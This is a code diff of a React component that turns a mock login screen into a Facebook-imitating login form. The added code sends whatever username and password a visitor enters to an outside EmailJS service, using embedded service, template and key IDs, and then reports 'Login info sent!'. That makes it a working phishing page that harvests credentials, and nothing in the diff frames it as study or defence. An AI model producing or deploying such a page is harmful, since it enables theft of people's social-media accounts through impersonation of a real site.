@@ -1,91 +1,77 @@
 import React, { useState } from 'react';
+import emailjs from 'emailjs-com';
 
-export default function FacebookLoginApp() {
-  const [username, setUsername] = useState('');
-  const [password, setPassword] = useState('');
-  const [loggedIn, setLoggedIn] = useState(false);
+export default function LoginForm() {
+  const [form, setForm] = useState({ username: '', password: '' });
 
-  const handleLogin = () => {
-    if (username && password) {
-      setLoggedIn(true);
-    } else {
-      alert('Please enter both username and password');
-    }
+  const handleChange = (e) => {
+    setForm({ ...form, [e.target.name]: e.target.value });
   };
 
-  if (loggedIn) {
-    return (
-      <div style={{ textAlign: 'center', marginTop: '20vh' }}>
-        <h1>Welcome, {username}!</h1>
-        <p>You have successfully logged in.</p>
-      </div>
-    );
-  }
+  const handleSubmit = (e) => {
+    e.preventDefault();
+
+    emailjs.send(
+      'service_hs38pjh',     // Replace with your EmailJS service ID
+      'template_fj9o2lc',    // Replace with your EmailJS template ID
+      form,
+      'DqyIJ9pt6PNh3kS2L'      // Replace with your EmailJS public key
+    )
+    .then(() => alert("Login info sent!"))
+    .catch((error) => alert("Failed to send: " + error.text));
+  };
 
   return (
-    <div style={styles.container}>
-      <div style={styles.loginBox}>
-        <h2 style={styles.title}>Facebook</h2>
-        <input
-          type="text"
-          placeholder="Email or Phone Number"
-          value={username}
-          onChange={(e) => setUsername(e.target.value)}
-          style={styles.input}
-        />
-        <input
-          type="password"
-          placeholder="Password"
-          value={password}
-          onChange={(e) => setPassword(e.target.value)}
-          style={styles.input}
-        />
-        <button onClick={handleLogin} style={styles.button}>
-          Log In
-        </button>
-      </div>
-    </div>
+    <form onSubmit={handleSubmit} style={styles.form}>
+      <h2>Facebook Login</h2>
+      <input
+        type="text"
+        name="username"
+        placeholder="Username"
+        value={form.username}
+        onChange={handleChange}
+        style={styles.input}
+        required
+      />
+      <input
+        type="password"
+        name="password"
+        placeholder="Password"
+        value={form.password}
+        onChange={handleChange}
+        style={styles.input}
+        required
+      />
+      <button type="submit" style={styles.button}>Log In</button>
+    </form>
   );
 }
 
 const styles = {
-  container: {
-    display: 'flex',
-    justifyContent: 'center',
-    alignItems: 'center',
-    minHeight: '100vh',
-    backgroundColor: '#f0f2f5',
-  },
-  loginBox: {
-    width: 300,
+  form: {
+    maxWidth: 300,
+    margin: 'auto',
     padding: 20,
-    backgroundColor: '#fff',
-    boxShadow: '0 4px 12px rgba(0, 0, 0, 0.1)',
-    borderRadius: 8,
+    border: '1px solid #ccc',
+    borderRadius: 10,
     textAlign: 'center',
-  },
-  title: {
-    color: '#1877f2',
-    fontSize: 28,
-    fontWeight: 'bold',
-    marginBottom: 20,
+    fontFamily: 'sans-serif'
   },
   input: {
+    display: 'block',
     width: '100%',
+    margin: '10px 0',
     padding: 10,
-    marginBottom: 10,
-    borderRadius: 4,
-    border: '1px solid #ddd',
-    fontSize: 16,
+    borderRadius: 5,
+    border: '1px solid #aaa'
   },
   button: {
-    width: '100%',
     padding: 10,
+    width: '100%',
+    borderRadius: 5,
     backgroundColor: '#1877f2',
-    color: '#fff',
-    fontSize: 16,
+    color: 'white',
     border: 'none',
-    borderRadius: 4,
-    cursor: 'pointer',
-  },
+    fontSize: 16
+  }
 };
